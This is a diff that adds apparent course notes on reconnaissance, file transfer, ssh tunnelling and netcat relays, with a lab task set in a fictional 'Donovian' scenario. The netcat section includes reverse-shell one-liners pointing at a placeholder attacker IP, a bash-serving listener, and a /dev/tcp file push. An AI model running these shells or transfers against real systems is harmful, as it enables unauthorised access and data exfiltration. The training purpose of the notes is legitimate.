@@ -144,73 +144,172 @@ socket.socket([*family*[,*type*[*proto*]]])
 
 
 
+# Recon
+WHOIS - Domain name to Ip & Info
+
+**Key Ports* 
+nmap -Pn 10.10.0.40 -p 21,22,23,80
+
+NetCat for banner grabbing!!!
+
+ip neigh | grep REACH -- finding local machines
+
+**getting webpages//files**
+curl 
+wget -r~recursive
+ftp
+
+# router commands 
+show int 
+
+
+# Data Transfer 
+### TFTP
+          -UDP
+          -small
+          -insecure
+          -no terminal communication
+          
+### FTP
+          -TCP
+          -control 21 Data 20
+          -insecure by default
+          -has dir services
+          -anonymous login
+
+### SFTP             
+          -TCP 22
+          -ftp + ssh
+          -terminal
+          
+### FTPS
+          -TCP 443
+          -adds SSL/TLS
+          -teminal
+'''
+nc 10.50.30.212 21 **banner grab**
+          ftp 10.50.30.212
+                    Anonymous
+          Passive
+          **if not working, possibly using public ip so data channel is built to the middle man**
+          **May be useful for bypassing firewalls**
+'''
+ ### remember wget! wget -r ftp://10.0.0.104 ---specify port
+ 
+ 
+### SCP
+          -tcp 22   Uses -P to specify alt port
+          -non interactive
+          
+          Download from remote to local
+ scp student@172.16.82.106:secretstuff.txt /home/student        
+          Upload to remote from local
+  scp secretstuff.txt student@172.16.82.106:/home/student        
+          copy from remote to remote                                  **-3 uses me as the middle man**
+    scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student      
+
+          **TUNNEL**
+ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+
+          Download from remote to local
+scp -P 1111 student@localhost:secretstuff.txt /home/student
+
+          Upload to remote from local
+scp -P 1111 secretstuff.txt student@localhost:/home/student          
+
+
+### Netcat
+          Client to listener
+Client (sends file): nc 10.2.0.2 9001 < file.txt
+Listener (receive file): nc -l -p 9001 > newfile.txt
+
+          Listener to Client
+Listener (sends file): nc -l -p 9001 < file.txt
+Client (receive file): nc 10.2.0.2 9001 > newfile.txt
+
+mknod mypipe p
+nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
+nc -l -p 9002 < infile.txt
+nc -l -p 9001 > outfile.txt
+
+          Useful if host doesnt have netcat
+nc -l -p 1111 > file.txt
+
+cat file.txt > /dev/tcp/10.2.0.2/1111
+
+          **Reverse shell using NETCAT**
+          When shelled into the remote host using -c :
+
+nc -c /bin/sh <your ip> <any unfiltered port>
+
+          You could even pipe BASH through NETCAT.
+
+/bin/sh | nc <your ip> <any unfiltered port>
 
+          Then listen for the shell.
 
+nc -l -p <same unfiltered port> -vvv
 
+          You can also listen using the -e with NETCAT.
 
+nc -l -p <any unfiltered port> -e /bin/bash
 
 
+## Pipes 
+mkfifo APIPE          **three seprate machines**
+nc -lp 3334 > APIPE | nc 10.50.34.84 12009 < APIPE
+nc 10.0.0.101 3334 < newsecret.file
+nc -lp 12009 
 
+          
+### EXAMP
+nc -lp 1234 > piper | nc 10.50.39.61 5432 < piper         
+nc 172.16.82.115 9876 > piper | nc 10.50.39.61 5432 < piper
 
+PHRASE 1--I just invent. Then I wait until man comes around to needing what I have invented
+PHRASE 2--Computers have lots of memory but no imagination
+PHRASE 3--Hardware: The parts of a computer system that can be kicked
+PHRASE 4--Technology makes it possible for people to gain control over everything, except over technology          
+          
+TASK 1
+Task 1 Netcat Relay
 
+Objective: You have been provided intel in regards to colecting key intelligence and sensitive data from Donovian Cyberspace, move and redirect all data back to your INTERNET-HOST. A Donovian Insider has stashed important information in the form of JPG images on T2. Each JPG image contains a piece of the message in the form of Steganography. Utilizing Netcat relays, you will use the designated RELAY to transfer the JPG images to your INTERNET-HOST. Once the images are downloaded you will use a command-line tool called steghide to extract the message.
 
+Utilize the targets T1, T2, and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
 
+    The Donovian Insider provided a image called 1steg.jpg on T2 and is trying to connect to RELAY on TCP port 1234 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
 
+    The Donovian Insider provided a image called 2steg.jpg on T2 and is trying to connect to RELAY on TCP port 4321 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
 
+    The Donovian Insider provided a image called 3steg.jpg on T2 listening for a connection from RELAY on TCP port 6789. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
 
+    The Donovian Insider provided a image called 4steg.jpg on T2 listening for a connection from RELAY on TCP port 9876. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
 
+    Use the syntax: steghide extract -sf [image name] to extract the hidden message. Use password when prompted for a passphrase.
+          
 
+          
+          
+Task 1
 
+T1
+Hostname: INTERNET_HOST
+External IP: 10.50.XXX.XXX (ALREADY PROVIDED) Internal IP: 10.10.0.40 (ALREADY PROVIDED) (accessed via FLOAT IP)
+creds: (ALREADY PROVIDED)
+Action: Successfully transfer file data between hosts via Netcat
 
+T2
+Hostname: BLUE_HOST-4
+IP: 172.16.82.115
+creds: (NONE)
+Action: Successfully transfer files from this host using Netcat
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+RELAY
+Hostname: BLUE_INT_DMZ_HOST-1
+IP: 172.16.40.10
+creds: (ALREADY PROVIDED)
+Action: Successfully transfer file data between hosts via Netcat
 
 
 
